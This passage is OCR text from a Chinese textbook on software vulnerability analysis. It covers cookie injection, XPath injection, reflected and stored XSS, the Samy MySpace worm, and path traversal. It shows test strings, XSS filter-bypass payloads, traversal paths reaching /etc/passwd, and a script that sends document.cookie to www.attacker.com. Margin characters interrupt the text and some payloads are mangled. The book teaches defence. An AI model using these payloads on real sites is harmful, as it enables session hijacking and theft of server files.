253
---
## Page 279
0
day
按下回车键，浏览器会弹出一个对话框，内容为：id=169。然后点击浏览器的刷新按键，
安
如果此时返回了正常结果，则表明该站点可以Cookie来提交数据。
全
然后我们来检测该站点是否存在Cookie注入漏洞，在浏览器中分别输入下面两句并刷新：
：
javascript:alert(document.cookie="id=*+escape("169 and1=1*));
软
件
javascript:alert（document.cookie="id=*+escape(*169and1=2"));
漏
如果第一条语句执行后刷新返回了正常的结果，第二条语句执行后刷新没有返回正常结
洞
果，那么该站点就存在Cookie注入漏洞。攻击者可以使用Cookie构造SQL注入语句来进行注
分
析
入攻击。
技
术
8.3.2XPath注入，XML的阿喀琉斯之
（第
随着XML被越来越多的人们应用，XML的数据安全问题也逐渐凸显出来。XPath是XML
2
路径语言，它通过“引用数据”的方式从XML文档中读取各种信息，并且具有很好的松散输
版
入特性和容错特性。正是由于这种特性，使得攻击者能够在URL、表单或其他地方附上精心构
造好的XPath查询语句来获得权限。
下这条SQL语句：
Selectfromtable_namewhereuser='adminandpsw=123'i
中输入'or1=1来绕过验证。现在，如果存放用户验证信息的不是一个数据库表，而是一个XML
文件，将会是怎样的呢？
假设如下一个XML文件包含了用户信息：
admin
123
那么对应的XPath查询语句应该为：
//users/admin[name/text(）='admin'and password/text(）='123']
在XPath语句中，“//”表示选择全部节点，如users/admin表示列举users/admin下的全部
节点：中括号里面的语句是谓词。以上这条查询语句的涵义为：选择users节点中admin节点
下的name属性为'admin'并且password属性为'123"的所有节点。
如果在用户名和密码输入框中都输入'or'1'='1，XPath语句将变为：
//users/admin[name/text()='or1''1′and password/text(）=or1'='1']
254
---
## Page 280
第
显然中括号内部的谓词是True，所以将选择所有admin用户，用户名密码认证自然就被绕
8
过去了。
章
XPat注入与SQL注入十分相似，所以它们的预防方法也是很类似的。有一点值得注意的
其
是，虽然数据库可以采用参数化查询来防止SQL注入，但是XPath中却不支持参数化查询。
他
幸运的是，我们可以采用XQuery来模拟参数化查询，从而防止注入的发生。
类
型
8.4XSS攻击
的
软
件
8.4.1脚本能够“跨站”的原因
漏
洞
XSS是跨站脚本（CrossSiteScript）的意思，由于网站技术中的CascadingStyleSheets缩
写为CSS，为了不至于产生概念混淆，故一般用XSS来简称跨站脚本。
从数量上讲，XSS是目前所有漏洞中所占比例最大的一类，编程时稍不留意就会产生这种
漏洞，而且防不胜防。
在很多Web应用中，服务器都将客户端输入或请求的数据“经过简单的加工”后，再以页
面文本的形式返回给客户端。例如，搜索引擎将用户输入的搜索串返回至页面中：运行出错时
将用户输入的信息返回在错误提示页面中：论坛中显示用户提交的帖子等。
（3）用户点击载有XSS的链接，向WebServer发送URL请求。
（4）存在漏洞的WebServer简单地把XSS当做网页文本返回给客户端。
（5）用户收到网站的反馈，但是发现网页中的不是文本，而是脚本命令，于是会执行这些
脚本命令。
256
---
## Page 282
第
8章
其他类型的软件漏洞
存在XSS漏洞的
WebServer
XSS
Reflection
5：用户的浏
览器执行页面
2：攻击者发给用户带有XSS的URL链接
SSX
6：用户浏览器将session token等发送给攻击
图8.4.2XSSRefelection攻击场景
（6）用户的浏览器执行的XSS是
vari=newImage;i.src=*http://
+document.cookie;
这些脚本使浏览器携带着当前会话的SessionID向www.attacker.com发送请求，攻击者这
时正在www.attacker.com等着这次请求：
GET/seSsId=47e9.HTTP/1.1
Host:www.attacker.com
（7）攻击者利用得到的SessionID，伪装成用户登录网站，来完成SessionHi-Jack攻击。
对于这个攻击场景，您可能还有一些疑感的地方，例如，为什么要用XSS这么大费周折
地窃取用户的cookie，直接发一个本身就有恶意脚本的网站链接（如www.attacker.com）给用
户不是更简单吗？原因以下两点。
首先，只有参与会话的网站返回的脚本才有权访问SessionID，也就是说，在www.attacker.com
中请求“document.cookie”是无法得到testapp.com的SessionID的。而利用XSSReflection的
攻击恰恰让这次cookie访问看起来是来自于testapp.com的访问，因此能够成功。
其次，用户是信任testapp.com网站的，冒失地发给用户一个www.attacker.com的链接很容
易露馅。实际上，攻击者往往会采用一些编码技术让载有XSS的URL显得更加逼真。
257
---
## Page 283
day安全：
0
8.4.3StoredxSS攻击场景
XSSReflection常发生于搜索引擎、错误提示页面等对用户输入的直接反馈中。如果-个
论坛或者blog空间中对用户提交文章中的文本信息没有很好地过滤，将导致XSS被存储在Web
软件漏洞分析技术
Server上，这就是StoredXSS漏洞。
对于StoredXSS，上述的SessionHi-Jack攻击流程会稍有不同，如图8.4.3所示。
（第2版）
存在XSS漏洞的
WebServer
5：用户的浏
览器执行文章
6：用户浏览器将sessiontoken等发送给攻击者
中的XSS
图8.4.3StoredXSS攻击场景
8.4.4攻击案例回顾：XSS螨虫
MySpace是一个在全球拥有两亿用户的公共交友平台，为广大用户提供blog、邮件、资讯
等众多服务。虽然这个著名的网站对用户的输入已经做了相当完善的过滤，即便如此，还是有
人找到了突破这些字符过滤的办法。
2005年，一个名为Samy的MySpace用户在自己的个人资料中加入了一些JavaScript，所
有打开该页面的客户端浏览器都将执行这个脚本。这些XSS主要用来做两件事：首先把攻击
者加为好友，其次把这段XSS复制到被攻击者的个人资料中去。
这样做的结果是在MySpace上引发了一场大规模的基于XSS漏洞的烯虫传播，一个小时
之内，Samy好友的数目超过了一百万个。MySpace为了清除所有被感染的用户文档中的XSS，
而被迫停止运行。Samy最终被判处对MySpace进行经济赔偿并做三个月的社会义工。
XSS蠕虫攻击改变了人们以往认为XSS无法攻击网站本身的态度，是XSS漏洞利用技术
上的一个突破，也为轻视XSS漏洞的开发人员和安全专家敲响了警钟。
258
---
## Page 284
第
8.4.5XSS的检测与防范
8
章
按照利用方式的不同，可以把XSS漏洞大致分为三类，如表8-4-1所示。
其
表8-4-1XSS漏洞分类
他
类
型
对应的Web应用
利用方式及危害
类
.htm文件
型
的
本地的XSS
.chm文件（帮助文档）
攻击用户桌面
软
.mht 文件
件
dllsand.exe等PE文件的内部资源中也可能存在XSS
漏
搜索引擎，错误信息提示等将在页面中显示用户输入
窃取cookie，更改返回页面的
洞
无存储的XSS
的Web应用
内容，如XSS Reflection
BBS、论坛、博客等存储用户数据并提供显示的Web
XSS Worm攻击、Stored xSS
有存储的XSS
应用
攻击
在上述这些Web应用场景中，应当特别注意XSS漏洞。最常用于检测XSS的POC代码
就是用于弹出警告消息的那句JavaScript：
javascript:alert('xss');
作为安全测试人员，除了尝试这种基本形式的POC之外，为了测试过滤系统的完备性，
以下形式的测试用例往往可以给您一些启发，如表8-4-2所示。
表8-4-2XSS测试用例
XSS测试用例
javascript:alert(XSS'):
JaVaScRiPt:aler(XSS")
javascript:alert(&quot;XSS&quot;)
&#97；&#108；&#101&#114；&#116&#40;&#39&#88&#83；&#83；&#39&#41；
&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29
javascript:alert(XSS')
jav&#x09;ascript:alert(XSS')
AAAAAA
另外，对一些非常敏感的HTML标签的过滤也要非常小心。这些TAG包括、
、、、、、、、、、
、、。
259
---
## Page 285
0
day
在将文本返回给客户端浏览器时，对敏感字符进行编码替换是一个防御XSS攻击的简单
安
而有效的办法，例如，对以下字符进行编码替换，如表8-4-3所示。
全
表8-4-3字符的编码替换
软
敏感字符
十进制编码
十六进制编码
HTML字符集
Unicode编码
件
&#34
&#x22
&quot
u0022
漏
&#39
&#x27
soderg
u0027
洞
&
&#38
&#x26
&amp
分
w0026
析
>
&#60
&#x3C
&lt
w003c
技
&#62
&3E
&gt
w003e
术
（第
8.5
路径回溯漏洞
2
版
8.5.1
路径回溯的基本原理
在Windows系统中，“”或者“”在路径中都表示“上一级”，比如下面这几个路径实
际上是等效的：
C:\WINDOWS\win.ini
C:\WINDOWS\SYSTEM32\..\Win.ini
C:\WINDOWS\../WINDOWS\Win.ini
在Linux中，下面这儿个路径也是等效的：
/etc/passwd
/home/users/php/templates/../../../../etc/passwd
/home/users/php/templates/../../../../../../../../../../../etc/passwd
当足够多的“”使得路径跳转到根目录时，多余的“”将被忽略掉。
在URL中，可以采用“”和“”来表示“上一级”，并且可以用编码的方式进行表述。
表8-5-1中列举了常用的编码方式。
以上介绍的这种使得路径向上跳转的方式，就叫做路径回溯。如果开发者没有对路径回溯
进行过滤或者权限控制的话，攻击者可以通过精心构造回溯路径获得服务器上的敏感文件，从
而进行进一步的渗透工作。
表8-5-1URL的路径回溯编码
编